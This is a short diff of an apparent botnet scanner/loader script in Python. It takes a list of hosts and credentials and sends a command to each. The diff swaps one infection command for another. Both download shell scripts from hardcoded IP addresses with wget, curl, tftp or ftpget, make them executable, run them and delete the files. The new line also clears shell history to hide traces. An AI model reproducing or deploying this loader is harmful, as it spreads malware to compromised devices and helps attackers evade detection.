@@ -7,7 +7,7 @@ from threading import Thread
 if len(sys.argv) < 2:
 	sys.exit("\033[37mUsage: python "+sys.argv[0]+" [list]")
 
-cmd="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.245.173.145/bins.sh; curl -O http://172.245.173.145/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 172.245.173.145 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 172.245.173.145; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 172.245.173.145 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *" #command to send
+cmd="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.132.43.168/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g 185.132.43.168 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c" #command to send
 info = open(str(sys.argv[1]),'a+')
 
 def sqwad(ip,username,password):
